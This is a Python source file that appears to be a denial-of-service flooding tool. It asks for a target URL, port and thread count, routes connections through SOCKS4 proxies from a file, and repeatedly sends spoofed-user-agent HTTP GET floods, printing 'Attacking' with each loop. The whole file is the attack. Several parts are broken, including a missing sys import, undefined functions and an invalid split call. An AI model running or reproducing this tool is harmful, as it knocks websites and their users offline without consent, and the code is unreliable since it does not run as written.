import urllib
import random
import socket
import threading
import time
import os
import socks
from sys import stdout
from queue import Queue
import requests
import string

ip = str(input("[+]URL :"))
port = int(input("[+]PORT :"))
threads = int(input("[+]SEND :"))

q = Queue()
w = Queue()

ip = socket.gethostbyname(ip)
proxy_path = "proxy.txt"

with open(proxy_path) as f:
    content = f.readlines()
    f.close()
proxies = 0
with open(proxy_path) as infp:
    for line in infp:
       if line.strip():proxies += 1
print('Loaded %d proxies \n' %proxies)
time.sleep(1)

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)


headers_referers=[]

global data
data ='''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive''';

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

#def run():
 #   run_through = threads
 #   use_proxy = content[run_through]
 #   user_agent()
    
    #if(port==80):
    #    referer="http://"
   # elif(port==443):
   #     referer="https://"


  #  s = socks.socksocket()

 #   proxy = Choice(content).strip().split(":")
 #   s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
 #   s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 #   s.connect((str(target), int(port)))
 #   print("[+] proxies ")

	
def my_bots():
	global bots
	bots=[]
	#contoh bot aja bro.. 
	bot1="https://www.google.com/?q="
	bots.append(bot1)
	return(bots)
    
def bot_hammering(ip):
	try:
		while True:
			sys.stdout.write("Bot>>fire . . .")
			sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
			req = urllib.request.urlopen(urllib.request.Request(ip,headers={'User-Agent': random.choice(uagent)}))
			time.sleep(.1)
	except:
		time.sleep(.1)
        
def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+ip)
		w.task_done()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data
    
class run2():
    def go():
        url_path = generate_url_path()
        user_agent()
        if(port==80):
            referer="http://"
        elif(port==443):
            referer="https://"
        elif(port==7777):
            referer="http://"
        elif(port==3389):
            referer="http://"	
        else:
            referer="http://"

        ss = socks.socksocket()
        proxy = random.choice(content).strip().split(":").split("\n")
        ss.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
        ss.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet = str("GET "+'/'+" HTTP/1.1\nReferer: "+referer+ip+'/'+"\nHost: "+ip+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
        while True:
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {ip}\n\n").encode()
            ss.connect((ip,int(port)))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,int(port)))
            s.send(byt)
            s.sendto(packet, (ip, int(port)))
            print("Attacking :"+referer+ip+'/')
            print(proxy)
            
for x in range(threads):
    my_bots()
    t2 = threading.Thread(target=dos2)
    t2.daemon = True
    t2.start()
    run2.go()